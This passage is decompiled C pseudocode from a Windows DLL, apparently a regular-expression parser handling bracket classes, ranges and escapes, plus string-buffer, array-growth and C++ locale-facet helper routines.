      iVar3 = FUN_10013990(param_2,param_3);
      return iVar3;
    }
    if ((((cVar1 != '}') && (cVar1 != ']')) && (cVar1 != ')')) && (cVar1 != '\0')) {
      if (cVar1 == '.') {
        iVar3 = FUN_1000f110(4);
        if (-1 < iVar3) {
          *param_2 = *param_2 + 1;
          *param_3 = 0;
          return iVar3;
        }
      }
      else if ((cVar1 == '$') && (pcVar2[1] == '\0')) {
        iVar3 = FUN_1000f110(3);
        if (-1 < iVar3) {
          iVar4 = FUN_1000f1a0(iVar3);
          *(undefined4 *)(iVar4 + 4) = 0;
          *param_2 = *param_2 + 1;
          *param_3 = 0;
          return iVar3;
        }
      }
      else {
        iVar3 = FUN_1000f110(3);
        if (-1 < iVar3) {
          cVar1 = *(char *)*param_2;
          iVar4 = FUN_1000f1a0(iVar3);
          *(int *)(iVar4 + 4) = (int)cVar1;
          *param_2 = *param_2 + 1;
          *param_3 = 0;
          return iVar3;
        }
      }
    }
  }
  return -1;
}



/* Function: FUN_100136f0 */

uint __thiscall FUN_100136f0(int *param_1,undefined4 *param_2,undefined4 param_3)

{
  code *pcVar1;
  uint uVar2;
  uint uVar3;
  int iVar4;
  uint uVar5;
  int iVar6;
  
  uVar2 = FUN_1000f110(0x1f);
  if ((int)uVar2 < 0) {
    return 0xffffffff;
  }
  if (uVar2 < (uint)param_1[2]) {
    *(int *)(param_1[1] + 4 + uVar2 * 8) = param_1[5];
    uVar3 = FUN_1000f110(1);
    if ((int)uVar3 < 0) {
      return 0xffffffff;
    }
    if ((uint)param_1[2] <= uVar3) goto LAB_1001384e;
    *(int *)(param_1[1] + 4 + uVar3 * 8) = param_1[5];
    param_1[5] = param_1[5] + 1;
    iVar4 = FUN_1000f110(0x10);
    if (iVar4 < 0) {
      return 0xffffffff;
    }
    uVar5 = FUN_1000f110(0x20);
    if ((int)uVar5 < 0) {
      return 0xffffffff;
    }
    if (uVar2 < (uint)param_1[2]) {
      if (uVar5 < (uint)param_1[2]) {
        *(undefined4 *)(param_1[1] + 4 + uVar5 * 8) = *(undefined4 *)(param_1[1] + 4 + uVar2 * 8);
        iVar6 = FUN_1000f110(0x11);
        if (iVar6 < 0) {
          return 0xffffffff;
        }
        iVar6 = FUN_10012e30(param_2,param_3);
        if (iVar6 < 0) {
          if (*param_1 != 0) {
            return 0xffffffff;
          }
          if (*(char *)*param_2 != '}') goto LAB_10013832;
          iVar6 = FUN_1000f110(0);
          if (iVar6 < 0) {
            return 0xffffffff;
          }
        }
        iVar4 = FUN_1000f1a0(iVar4);
        *(int *)(iVar4 + 4) = iVar6;
        if (*(char *)*param_2 == '}') {
          *param_2 = (char *)*param_2 + 1;
          iVar4 = FUN_1000f110(2);
          if (iVar4 < 0) {
            return 0xffffffff;
          }
          iVar6 = FUN_1000f1a0(uVar3);
          iVar4 = FUN_1000f1a0(iVar4);
          *(undefined4 *)(iVar4 + 4) = *(undefined4 *)(iVar6 + 4);
          return uVar2;
        }
LAB_10013832:
        *param_1 = 2;
        return 0xffffffff;
      }
      goto LAB_10013862;
    }
  }
  else {
    FUN_10007f20(0x80070057);
LAB_1001384e:
    FUN_10007f20(0x80070057);
  }
  FUN_10007f20(0x80070057);
LAB_10013862:
  FUN_10007f20(0x80070057);
  pcVar1 = (code *)swi(3);
  uVar2 = (*pcVar1)();
  return uVar2;
}



/* Function: FUN_10013870 */

uint __thiscall FUN_10013870(int *param_1,undefined4 *param_2,undefined4 param_3)

{
  code *pcVar1;
  uint uVar2;
  int iVar3;
  
  uVar2 = FUN_1000f110(0x10);
  if ((int)uVar2 < 0) {
    return 0xffffffff;
  }
  iVar3 = FUN_1000f110(0x11);
  if (iVar3 < 0) {
    return 0xffffffff;
  }
  iVar3 = FUN_10012e30(param_2,param_3);
  if (iVar3 < 0) {
    if (*param_1 != 0) {
      return 0xffffffff;
    }
    if (*(char *)*param_2 != ')') goto LAB_100138e9;
    iVar3 = FUN_1000f110(0);
    if (iVar3 < 0) {
      return 0xffffffff;
    }
  }
  if ((uint)param_1[2] <= uVar2) {
    FUN_10007f20(0x80070057);
    pcVar1 = (code *)swi(3);
    uVar2 = (*pcVar1)();
    return uVar2;
  }
  *(int *)(param_1[1] + 4 + uVar2 * 8) = iVar3;
  if (*(char *)*param_2 == ')') {
    *param_2 = (char *)*param_2 + 1;
    return uVar2;
  }
LAB_100138e9:
  *param_1 = 3;
  return 0xffffffff;
}



/* Function: FUN_10013910 */

int __thiscall FUN_10013910(undefined4 *param_1,undefined4 *param_2,undefined1 *param_3)

{
  char cVar1;
  char *pcVar2;
  int iVar3;
  
  *param_3 = 0;
  pcVar2 = (char *)*param_2;
  cVar1 = *pcVar2;
  if (cVar1 != ']') {
    if (cVar1 == '^') {
      *param_2 = pcVar2 + 1;
    }
    pcVar2 = (char *)*param_2;
    if (*pcVar2 != ']') {
      iVar3 = FUN_10013bd0(param_2,cVar1 == '^');
      if (-1 < iVar3) {
        if (*(char *)*param_2 != ']') {
          *param_1 = 4;
          return -1;
        }
        *param_2 = (char *)*param_2 + 1;
      }
      return iVar3;
    }
  }
  *param_2 = pcVar2 + 1;
  *param_1 = 6;
  return -1;
}



/* Function: FUN_10013990 */

uint __thiscall FUN_10013990(int param_1,undefined4 param_2,undefined4 param_3)

{
  code *pcVar1;
  uint uVar2;
  uint uVar3;
  int iVar4;
  uint uVar5;
  int iVar6;
  int iVar7;
  
  uVar2 = FUN_1000f110(0x16);
  if ((int)uVar2 < 0) {
LAB_100139be:
    uVar3 = FUN_1000f110(0x17);
    if (-1 < (int)uVar3) {
      if (*(uint *)(param_1 + 8) <= uVar3) goto LAB_10013b2c;
      *(undefined4 *)(*(int *)(param_1 + 4) + 4 + uVar3 * 8) = *(undefined4 *)(param_1 + 0x18);
      *(int *)(param_1 + 0x18) = *(int *)(param_1 + 0x18) + 1;
    }
    iVar4 = FUN_1000f110(0x10);
    if (iVar4 < 0) {
      return 0xffffffff;
    }
    uVar5 = FUN_1000f110(0x18);
    if ((int)uVar5 < 0) {
      return 0xffffffff;
    }
    if (*(uint *)(param_1 + 8) <= uVar2) goto LAB_10013b36;
    if (*(uint *)(param_1 + 8) <= uVar5) goto LAB_10013b40;
    *(undefined4 *)(*(int *)(param_1 + 4) + 4 + uVar5 * 8) =
         *(undefined4 *)(*(int *)(param_1 + 4) + uVar2 * 8 + 4);
    uVar5 = FUN_1000f110(0x19);
    if ((int)uVar5 < 0) {
      return 0xffffffff;
    }
    if (uVar3 < *(uint *)(param_1 + 8)) {
      if (uVar5 < *(uint *)(param_1 + 8)) {
        *(undefined4 *)(*(int *)(param_1 + 4) + 4 + uVar5 * 8) =
             *(undefined4 *)(*(int *)(param_1 + 4) + uVar3 * 8 + 4);
        iVar6 = FUN_1000f110(0xd);
        if (iVar6 < 0) {
          return 0xffffffff;
        }
        uVar5 = FUN_10013520(param_2,param_3);
        if ((int)uVar5 < 0) {
          return uVar5;
        }
        iVar4 = FUN_1000f1a0(iVar4);
        *(uint *)(iVar4 + 4) = uVar5;
        iVar4 = FUN_1000f110(0x18);
        if (iVar4 < 0) {
          return 0xffffffff;
        }
        iVar7 = FUN_1000f1a0(uVar2);
        iVar4 = FUN_1000f1a0(iVar4);
        *(undefined4 *)(iVar4 + 4) = *(undefined4 *)(iVar7 + 4);
        iVar4 = FUN_1000f110(0x19);
        if (iVar4 < 0) {
          return 0xffffffff;
        }
        iVar7 = FUN_1000f1a0(uVar3);
        iVar4 = FUN_1000f1a0(iVar4);
        *(undefined4 *)(iVar4 + 4) = *(undefined4 *)(iVar7 + 4);
        iVar4 = FUN_1000f110(0x11);
        if (iVar4 < 0) {
          return 0xffffffff;
        }
        iVar6 = FUN_1000f1a0(iVar6);
        *(int *)(iVar6 + 4) = iVar4 + 1;
        return uVar2;
      }
      goto LAB_10013b54;
    }
  }
  else {
    if (uVar2 < *(uint *)(param_1 + 8)) {
      *(undefined4 *)(*(int *)(param_1 + 4) + 4 + uVar2 * 8) = *(undefined4 *)(param_1 + 0x18);
      *(int *)(param_1 + 0x18) = *(int *)(param_1 + 0x18) + 1;
      goto LAB_100139be;
    }
    FUN_10007f20(0x80070057);
LAB_10013b2c:
    FUN_10007f20(0x80070057);
LAB_10013b36:
    FUN_10007f20(0x80070057);
LAB_10013b40:
    FUN_10007f20(0x80070057);
  }
  FUN_10007f20(0x80070057);
LAB_10013b54:
  FUN_10007f20(0x80070057);
  pcVar1 = (code *)swi(3);
  uVar2 = (*pcVar1)();
  return uVar2;
}



/* Function: FUN_10013b60 */

int __thiscall FUN_10013b60(undefined4 *param_1,int *param_2,undefined4 param_3)

{
  int *piVar1;
  int iVar2;
  char *pcVar3;
  undefined **ppuVar4;
  
  piVar1 = param_2;
  ppuVar4 = &PTR_s_a__a_zA_Z0_9___10096650;
  if (PTR_s_a__a_zA_Z0_9___10096650 != (undefined *)0x0) {
    pcVar3 = PTR_s_a__a_zA_Z0_9___10096650;
    do {
      if (*(char *)*param_2 == *pcVar3) {
        param_2 = (int *)(*ppuVar4 + 1);
        iVar2 = FUN_100131b0(&param_2,param_3);
        if (iVar2 < 0) {
          *param_1 = 5;
          return iVar2;
        }
        *piVar1 = *piVar1 + 1;
        return iVar2;
      }
      pcVar3 = ppuVar4[1];
      ppuVar4 = ppuVar4 + 1;
    } while (pcVar3 != (char *)0x0);
  }
  return -1;
}



/* Function: FUN_10013bd0 */

int __thiscall FUN_10013bd0(int param_1,undefined4 *param_2,int param_3)

{
  uint uVar1;
  undefined4 *puVar2;
  char cVar3;
  code *pcVar4;
  byte bVar5;
  int iVar6;
  int iVar7;
  int iVar8;
  int *piVar9;
  int local_10;
  int local_c;
  byte local_5;
  
  iVar6 = FUN_1000f110((param_3 != 0) + '\x05');
  if ((-1 < iVar6) && (iVar7 = FUN_10013d60(4), -1 < iVar7)) {
    uVar1 = iVar6 + 1;
    if (*(uint *)(param_1 + 8) <= uVar1) {
      FUN_10007f20(0x80070057);
      pcVar4 = (code *)swi(3);
      iVar6 = (*pcVar4)();
      return iVar6;
    }
    iVar7 = *(int *)(param_1 + 4);
    puVar2 = (undefined4 *)(iVar7 + uVar1 * 8);
    *puVar2 = 0;
    puVar2[1] = 0;
    puVar2[2] = 0;
    puVar2[3] = 0;
    iVar7 = iVar7 + uVar1 * 8;
    *(undefined4 *)(iVar7 + 0x10) = 0;
    *(undefined4 *)(iVar7 + 0x14) = 0;
    *(undefined4 *)(iVar7 + 0x18) = 0;
    *(undefined4 *)(iVar7 + 0x1c) = 0;
    cVar3 = *(char *)*param_2;
    while ((cVar3 != '\0' && (cVar3 != ']'))) {
      iVar8 = FUN_10013cd0(param_2,&local_5,(int)&param_3 + 3);
      if (iVar8 != 0) {
        return -1;
      }
      iVar8 = (int)(char)local_5;
      if (iVar8 <= param_3._3_1_) {
        local_c = 0x1f;
        bVar5 = '\x01' << (local_5 & 7) | 1U >> 8 - (local_5 & 7);
        do {
          local_10 = iVar8 >> 3;
          piVar9 = &local_c;
          if (iVar8 >> 3 < 0x20) {
            piVar9 = &local_10;
          }
          iVar8 = iVar8 + 1;
          *(byte *)(*piVar9 + iVar7) = *(byte *)(*piVar9 + iVar7) | bVar5;
          bVar5 = bVar5 << 1 | (char)bVar5 < '\0';
        } while (iVar8 <= param_3._3_1_);
      }
      cVar3 = *(char *)*param_2;
    }
    return iVar6;
  }
  return -1;
}



/* Function: FUN_10013cd0 */

undefined4 __thiscall FUN_10013cd0(undefined4 *param_1,int *param_2,char *param_3,char *param_4)

{
  char *pcVar1;
  char cVar2;
  
  cVar2 = *(char *)*param_2;
  if (cVar2 == '\\') {
    pcVar1 = (char *)*param_2 + 1;
    *param_2 = (int)pcVar1;
    cVar2 = *pcVar1;
    if (cVar2 == 't') {
      cVar2 = '\t';
    }
    *param_3 = cVar2;
  }
  else {
    *param_3 = cVar2;
  }
  *param_2 = *param_2 + 1;
  pcVar1 = (char *)*param_2;
  if (*pcVar1 == '-') {
    *param_2 = (int)(pcVar1 + 1);
    cVar2 = pcVar1[1];
    if ((cVar2 == '\0') || (cVar2 == ']')) {
      *param_1 = 4;
      return 0xffffffff;
    }
    *param_4 = cVar2;
    *param_2 = (int)(pcVar1 + 2);
    if (*param_4 < *param_3) {
      *param_1 = 8;
      return 0xffffffff;
    }
  }
  else {
    *param_4 = *param_3;
  }
  return 0;
}



/* Function: FUN_10013d60 */

uint __thiscall FUN_10013d60(undefined4 *param_1,int param_2)

{
  uint uVar1;
  char cVar2;
  uint uVar3;
  
  uVar1 = param_1[2];
  uVar3 = param_2 + uVar1;
  if (uVar3 == 0) {
    if (param_1[1] != 0) {
      FUN_100579ee(param_1[1]);
      param_1[1] = 0;
    }
    param_1[2] = 0;
    param_1[3] = 0;
    return uVar1;
  }
  if ((uint)param_1[3] < uVar3) {
    cVar2 = FUN_10013ef0(uVar3);
    if (cVar2 == '\0') {
      *param_1 = 1;
      return 0xffffffff;
    }
    FUN_10006250();
  }
  else if (uVar1 < uVar3) {
    FUN_10006250();
    param_1[2] = uVar3;
    return uVar1;
  }
  param_1[2] = uVar3;
  return uVar1;
}



/* Function: FUN_10013e00 */

int * __fastcall FUN_10013e00(int *param_1)

{
  uint uVar1;
  int *piVar2;
  int iVar3;
  undefined4 extraout_ECX;
  undefined4 uVar4;
  int *extraout_ECX_00;
  undefined4 extraout_ECX_01;
  uint uVar5;
  
  if (param_1 != (int *)0x0) {
    if (*param_1 == 0) {
      param_1[2] = 0;
      *(undefined1 *)(param_1 + 3) = 0;
      uVar5 = param_1[1];
      uVar1 = FUN_1004b8a0(uVar5,param_1,0,0);
      if (uVar1 < uVar5) {
        param_1[2] = param_1[2] + uVar1;
        return param_1;
      }
      piVar2 = (int *)FUN_100073c0(uVar1);
      uVar4 = extraout_ECX;
      if (piVar2 == (int *)0x0) {
        return (int *)0x0;
      }
      goto LAB_10013e59;
    }
    LOCK();
    iVar3 = *param_1;
    *param_1 = iVar3 + -1;
    UNLOCK();
    if (iVar3 + -1 < 0) {
      FUN_100579ee(param_1);
      param_1 = extraout_ECX_00;
    }
  }
  iVar3 = FUN_1004b8a0(0,param_1,0,0);
  if ((iVar3 != 0) && (iVar3 != -1)) {
    uVar5 = 0x10;
    if (0x10 < iVar3 + 1U) {
      uVar5 = iVar3 + 1U;
    }
    uVar5 = uVar5 + 0xf & 0xfffffff0;
    piVar2 = (int *)FUN_100581b4(uVar5 + 0xf);
    if (piVar2 != (int *)0x0) {
      piVar2[1] = uVar5;
      *piVar2 = 0;
      piVar2[2] = 0;
      *(undefined1 *)(piVar2 + 3) = 0;
      uVar4 = extraout_ECX_01;
LAB_10013e59:
      iVar3 = FUN_1004b8a0(piVar2[1],uVar4,0,0);
      piVar2[2] = piVar2[2] + iVar3;
      return piVar2;
    }
  }
  return (int *)0x0;
}



/* Function: FUN_10013ef0 */

undefined4 __thiscall FUN_10013ef0(int *param_1,uint param_2)

{
  uint uVar1;
  int iVar2;
  void *_Dst;
  errno_t eVar3;
  uint uVar4;
  
  uVar1 = param_1[2];
  if (uVar1 < param_2) {
    if (*param_1 == 0) {
      if (param_2 < (uint)param_1[3]) {
        param_2 = param_1[3];
      }
      iVar2 = FUN_1005907c(param_2,8);
      *param_1 = iVar2;
      if (iVar2 == 0) {
        return 0;
      }
    }
    else {
      uVar4 = param_1[3];
      if (param_1[3] == 0) {
        uVar4 = uVar1 >> 1;
        if (uVar1 >> 1 < param_2 - uVar1) {
          uVar4 = param_2 - uVar1;
        }
      }
      if (param_2 < uVar1 + uVar4) {
        param_2 = uVar1 + uVar4;
      }
      _Dst = (void *)FUN_1005907c(param_2,8);
      if (_Dst == (void *)0x0) {
        return 0;
      }
      eVar3 = _memmove_s(_Dst,param_1[1] << 3,(void *)*param_1,param_1[1] << 3);
      FUN_10007f40(eVar3);
      FUN_100579ee(*param_1);
      *param_1 = (int)_Dst;
    }
    param_1[2] = param_2;
  }
  return 1;
}



/* Function: FUN_10013f90 */

undefined4 __fastcall FUN_10013f90(int *param_1,undefined4 param_2,int *param_3,int param_4)

{
  uint uVar1;
  uint uVar2;
  int iVar3;
  int *piVar4;
  uint uVar5;
  int *piVar6;
  int *piVar7;
  char cVar8;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  char *pcVar9;
  int iVar10;
  undefined4 uVar11;
  int local_70 [3];
  undefined4 local_64;
  undefined4 local_60;
  int local_5c;
  undefined4 local_48;
  int local_44;
  undefined4 local_40;
  undefined4 local_3c;
  undefined4 local_38;
  undefined4 local_34;
  undefined4 local_30;
  undefined4 local_2c;
  int local_28;
  int *local_24;
  char *local_20;
  uint local_1c;
  char *local_18;
  int *local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_10074990;
  local_10 = ExceptionList;
  uVar2 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  local_44 = 0;
  local_40 = 0;
  local_3c = 0;
  local_38 = 0;
  local_34 = 0;
  local_30 = 0;
  local_2c = 1;
  local_48 = 0;
  local_8 = 0;
  local_14 = param_1;
  FUN_10012020(param_2,param_1);
  piVar4 = (int *)*param_1;
  iVar3 = FUN_100074a0(0,1);
  *param_1 = iVar3;
  uVar11 = extraout_ECX;
  if ((iVar3 == 0) && (piVar4 != (int *)0x0)) {
    LOCK();
    iVar3 = *piVar4;
    *piVar4 = iVar3 + -1;
    UNLOCK();
    if (iVar3 + -1 < 0) {
      FUN_100579ee(piVar4,uVar2);
      uVar11 = extraout_ECX_00;
    }
  }
  FUN_1000f000(uVar11);
  local_8 = CONCAT31(local_8._1_3_,1);
  iVar3 = *param_1;
  if ((iVar3 == 0) || (*(int *)(iVar3 + 8) == 0)) {
LAB_100143f1:
    iVar3 = *param_1;
    if (iVar3 != 0) {
      pcVar9 = (char *)(iVar3 + 0xc);
      if (pcVar9 == (char *)0x0) {
LAB_1001440c:
        iVar10 = 0;
      }
      else {
        do {
          cVar8 = *pcVar9;
          pcVar9 = pcVar9 + 1;
        } while (cVar8 != '\0');
        iVar10 = (int)pcVar9 - (iVar3 + 0xd);
      }
LAB_1001440e:
      *(int *)(iVar3 + 8) = iVar10;
      *(undefined1 *)(iVar10 + 0xc + iVar3) = 0;
    }
  }
  else {
    if (iVar3 == 0) {
      iVar3 = 0;
    }
    else {
      iVar3 = iVar3 + 0xc;
    }
    iVar3 = FUN_10012110(iVar3,local_70,0);
    if (iVar3 == 0) goto LAB_100143f1;
    if (local_70[0] != 0) {
      local_18 = (char *)0x0;
      local_20 = (char *)0x0;
      FUN_1000efb0(0,&local_18,&local_20);
      uVar2 = (int)local_20 - (int)local_18;
      local_1c = uVar2;
      if ((local_18 == (char *)0x0) || (*local_18 != '\0')) {
        piVar4 = (int *)FUN_100075b0();
      }
      else {
        piVar4 = (int *)FUN_10007ae0();
      }
      uVar1 = local_1c;
      if (piVar4 == (int *)0x0) {
        uVar5 = 0;
      }
      else {
        uVar5 = piVar4[2];
      }
      iVar3 = *param_3;
      local_24 = piVar4;
      if (((iVar3 == 0) || (*(uint *)(iVar3 + 8) <= uVar5)) && (param_4 != 1)) {
        if (piVar4 == (int *)0x0) {
          iVar10 = 0;
        }
        else {
          iVar10 = piVar4[2];
        }
        if (iVar3 == 0) {
          iVar3 = 0;
        }
        else {
          iVar3 = *(int *)(iVar3 + 8);
        }
        if (iVar10 == iVar3) {
          uVar2 = 0;
          if (local_1c != 0) {
            do {
              uVar5 = FUN_10007ad0();
              if (uVar5 <= uVar2) break;
              iVar3 = FUN_10006f50();
              local_18[uVar2] = *(char *)(iVar3 + uVar2);
              uVar2 = uVar2 + 1;
            } while (uVar2 < uVar1);
          }
          iVar3 = *local_14;
          piVar4 = local_24;
          if (iVar3 != 0) {
            pcVar9 = (char *)(iVar3 + 0xc);
            if (pcVar9 == (char *)0x0) goto LAB_1001417b;
            do {
              cVar8 = *pcVar9;
              pcVar9 = pcVar9 + 1;
            } while (cVar8 != '\0');
            iVar10 = (int)pcVar9 - (iVar3 + 0xd);
            goto LAB_1001417d;
          }
        }
        else if (param_4 == 0) {
          uVar5 = 0;
          if (local_20 < local_18) {
            uVar2 = 0;
          }
          pcVar9 = local_18;
          if (uVar2 != 0) {
            do {
              uVar5 = uVar5 + 1;
              *pcVar9 = ' ';
              pcVar9 = pcVar9 + 1;
            } while (uVar5 < uVar2);
          }
          uVar2 = 0;
          if (local_1c != 0) {
            do {
              uVar5 = FUN_10007ad0();
              if (uVar5 <= uVar2) break;
              iVar3 = FUN_10006f50();
              local_18[uVar2] = *(char *)(iVar3 + uVar2);
              uVar2 = uVar2 + 1;
            } while (uVar2 < uVar1);
          }
          iVar3 = *local_14;
          piVar4 = local_24;
          if (iVar3 != 0) {
            pcVar9 = (char *)(iVar3 + 0xc);
            if (pcVar9 == (char *)0x0) {
LAB_1001417b:
              iVar10 = 0;
            }
            else {
              do {
                cVar8 = *pcVar9;
                pcVar9 = pcVar9 + 1;
              } while (cVar8 != '\0');
              iVar10 = (int)pcVar9 - (iVar3 + 0xd);
            }
LAB_1001417d:
            *(int *)(iVar3 + 8) = iVar10;
            *(undefined1 *)(iVar10 + 0xc + iVar3) = 0;
            piVar4 = local_24;
          }
        }
        else {
          uVar2 = 0;
          if (local_1c != 0) {
            do {
              uVar5 = FUN_10007ad0();
              if (uVar5 <= uVar2) break;
              iVar3 = FUN_10006f50();
              local_18[uVar2] = *(char *)(iVar3 + uVar2);
              uVar2 = uVar2 + 1;
            } while (uVar2 < uVar1);
          }
          iVar3 = *local_14;
          if (iVar3 == 0) {
            iVar10 = 0;
            iVar3 = 0;
          }
          else {
            iVar10 = iVar3 + 0xc;
            iVar3 = *(int *)(iVar3 + 8);
          }
          if (*(char *)(iVar3 + iVar10) == '\0') {
            if (*param_3 == 0) {
              iVar3 = 0;
            }
            else {
              iVar3 = *(int *)(*param_3 + 8);
            }
            pcVar9 = local_18 + iVar3;
            cVar8 = *local_20;
            if (cVar8 != '\0') {
              iVar3 = (int)local_20 - (int)pcVar9;
              do {
                *pcVar9 = cVar8;
                pcVar9 = pcVar9 + 1;
                cVar8 = pcVar9[iVar3];
              } while (cVar8 != '\0');
            }
            *pcVar9 = '\0';
          }
          iVar3 = *local_14;
          piVar4 = local_24;
          if (iVar3 != 0) {
            pcVar9 = (char *)(iVar3 + 0xc);
            if (pcVar9 == (char *)0x0) goto LAB_1001417b;
            do {
              cVar8 = *pcVar9;
              pcVar9 = pcVar9 + 1;
            } while (cVar8 != '\0');
            iVar10 = (int)pcVar9 - (iVar3 + 0xd);
            goto LAB_1001417d;
          }
        }
      }
      else {
        if (*local_14 == 0) {
          pcVar9 = (char *)0x0;
        }
        else {
          pcVar9 = (char *)(*local_14 + 0xc);
        }
        if ((pcVar9 == (char *)0x0) || (*pcVar9 != '\0')) {
          piVar6 = (int *)FUN_100075b0();
        }
        else {
          piVar6 = (int *)FUN_10007ae0();
        }
        if ((local_20 == (char *)0x0) || (*local_20 != '\0')) {
          piVar7 = (int *)FUN_100075b0();
        }
        else {
          piVar7 = (int *)FUN_10007ae0();
        }
        iVar3 = FUN_10007010(piVar6);
        *local_14 = iVar3;
        iVar3 = *param_3;
        if ((iVar3 != 0) && (*(int *)(iVar3 + 8) != 0)) {
          iVar3 = FUN_10007b60(iVar3 + 0xc,*(undefined4 *)(iVar3 + 8));
          *local_14 = iVar3;
        }
        if ((piVar7 != (int *)0x0) && (piVar7[2] != 0)) {
          iVar3 = FUN_10007b60(piVar7 + 3,piVar7[2]);
          *local_14 = iVar3;
        }
        iVar3 = *local_14;
        if (iVar3 != 0) {
          pcVar9 = (char *)(iVar3 + 0xc);
          if (pcVar9 == (char *)0x0) {
            iVar10 = 0;
          }
          else {
            local_28 = iVar3 + 0xd;
            do {
              cVar8 = *pcVar9;
              pcVar9 = pcVar9 + 1;
            } while (cVar8 != '\0');
            iVar10 = (int)pcVar9 - local_28;
          }
          *(int *)(iVar3 + 8) = iVar10;
          *(undefined1 *)(iVar10 + 0xc + iVar3) = 0;
        }
        if (piVar7 != (int *)0x0) {
          LOCK();
          iVar3 = *piVar7;
          *piVar7 = iVar3 + -1;
          UNLOCK();
          if (iVar3 + -1 < 0) {
            FUN_100579ee(piVar7);
          }
        }
        if (piVar6 != (int *)0x0) {
          LOCK();
          iVar3 = *piVar6;
          *piVar6 = iVar3 + -1;
          UNLOCK();
          if (iVar3 + -1 < 0) {
            FUN_100579ee(piVar6);
          }
        }
      }
      if (piVar4 != (int *)0x0) {
        LOCK();
        iVar3 = *piVar4;
        *piVar4 = *piVar4 + -1;
        UNLOCK();
        if (iVar3 + -1 < 0) {
          FUN_100579ee(piVar4);
        }
      }
      uVar11 = 1;
      goto LAB_10014418;
    }
    iVar3 = *param_1;
    if (iVar3 != 0) {
      pcVar9 = (char *)(iVar3 + 0xc);
      if (pcVar9 == (char *)0x0) goto LAB_1001440c;
      do {
        cVar8 = *pcVar9;
        pcVar9 = pcVar9 + 1;
      } while (cVar8 != '\0');
      iVar10 = (int)pcVar9 - (iVar3 + 0xd);
      goto LAB_1001440e;
    }
  }
  uVar11 = 0;
LAB_10014418:
  if (local_5c != 0) {
    FUN_100579ee(local_5c);
  }
  thunk_FUN_100579ee(local_60);
  local_60 = 0;
  thunk_FUN_100579ee(local_64);
  local_64 = 0;
  if (local_44 != 0) {
    FUN_100579ee(local_44);
  }
  ExceptionList = local_10;
  return uVar11;
}



/* Function: FUN_10014470 */

int * FUN_10014470(int *param_1)

{
  int *piVar1;
  uint uVar2;
  uint uVar3;
  int iVar4;
  int *piVar5;
  undefined1 local_28 [12];
  _Lockit local_1c [4];
  _Lockit local_18 [4];
  int *local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10074558;
  local_10 = ExceptionList;
  uVar3 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  std::_Lockit::_Lockit(local_1c,0);
  piVar1 = DAT_1009aca0;
  local_8 = 0;
  local_14 = DAT_1009aca0;
  if (DAT_1009b464 == 0) {
    std::_Lockit::_Lockit(local_18,0);
    if (DAT_1009b464 == 0) {
      DAT_10098090 = DAT_10098090 + 1;
      DAT_1009b464 = DAT_10098090;
    }
    std::_Lockit::~_Lockit(local_18);
  }
  uVar2 = DAT_1009b464;
  iVar4 = *param_1;
  if (DAT_1009b464 < *(uint *)(iVar4 + 0xc)) {
    piVar5 = *(int **)(*(int *)(iVar4 + 8) + DAT_1009b464 * 4);
    if (piVar5 != (int *)0x0) goto LAB_1001456d;
  }
  else {
    piVar5 = (int *)0x0;
  }
  if (*(char *)(iVar4 + 0x14) == '\0') {
LAB_10014519:
    if (piVar5 != (int *)0x0) goto LAB_1001456d;
  }
  else {
    iVar4 = FUN_10056caf(uVar3);
    if (uVar2 < *(uint *)(iVar4 + 0xc)) {
      piVar5 = *(int **)(*(int *)(iVar4 + 8) + uVar2 * 4);
      goto LAB_10014519;
    }
  }
  piVar5 = piVar1;
  if (piVar1 == (int *)0x0) {
    iVar4 = FUN_10014610(&local_14,param_1);
    if (iVar4 == -1) {
      FUN_1005851c("bad cast");
      FUN_1005de1b(local_28,&DAT_10092fd0);
    }
    piVar5 = local_14;
    DAT_1009aca0 = local_14;
    (**(code **)(*local_14 + 4))();
    Facet_Register(piVar5);
  }
LAB_1001456d:
  std::_Lockit::~_Lockit(local_1c);
  ExceptionList = local_10;
  return piVar5;
}



/* Function: FUN_10014590 */

int __thiscall FUN_10014590(int *param_1,undefined4 param_2)

{
  int *piVar1;
  int iVar2;
  
  piVar1 = (int *)*param_1;
  iVar2 = FUN_100074a0(param_2,1);
  *param_1 = iVar2;
  if (iVar2 == 0) {
    if (piVar1 != (int *)0x0) {
      LOCK();
      iVar2 = *piVar1;
      *piVar1 = iVar2 + -1;
      UNLOCK();
      if (iVar2 + -1 < 0) {
        FUN_100579ee(piVar1);
      }
    }
    if (*param_1 == 0) {
      return 0;
    }
  }
  if (*param_1 == 0) {
    return 0;
  }
  return *param_1 + 0xc;
}



/* Function: FUN_100145e0 */

void __thiscall FUN_100145e0(undefined4 *param_1,int *param_2)

{
  int iVar1;
  undefined4 uVar2;
  
  iVar1 = *param_2;
  if ((iVar1 != 0) && (*(int *)(iVar1 + 8) != 0)) {
    uVar2 = FUN_10007b60(iVar1 + 0xc,*(undefined4 *)(iVar1 + 8));
    *param_1 = uVar2;
  }
  return;
}



/* Function: FUN_10014610 */

undefined4 FUN_10014610(int *param_1,int *param_2)

{
  int iVar1;
  undefined4 *puVar2;
  undefined1 *puVar3;
  bool bVar4;
  _Locinfo local_48 [52];
  undefined4 local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10074b7b;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  bVar4 = false;
  local_14 = 0;
  if ((param_1 != (int *)0x0) && (*param_1 == 0)) {
    puVar2 = (undefined4 *)FUN_100582fa(8,DAT_100956e0 ^ (uint)&stack0xfffffffc);
    local_8 = 0;
    if (puVar2 == (undefined4 *)0x0) {
      puVar2 = (undefined4 *)0x0;
    }
    else {
      iVar1 = *param_2;
      if (iVar1 == 0) {
        puVar3 = &DAT_10083790;
      }
      else {
        puVar3 = *(undefined1 **)(iVar1 + 0x18);
        if (puVar3 == (undefined1 *)0x0) {
          puVar3 = (undefined1 *)(iVar1 + 0x1c);
        }
      }
      FUN_100082d0(puVar3);
      bVar4 = true;
      puVar2[1] = 0;
      *puVar2 = std::codecvt<char,char,int>::vftable;
    }
    *param_1 = (int)puVar2;
    if (bVar4) {
      std::_Locinfo::~_Locinfo(local_48);
    }
  }
  ExceptionList = local_10;
  return 2;
}



/* Function: FUN_100146c0 */

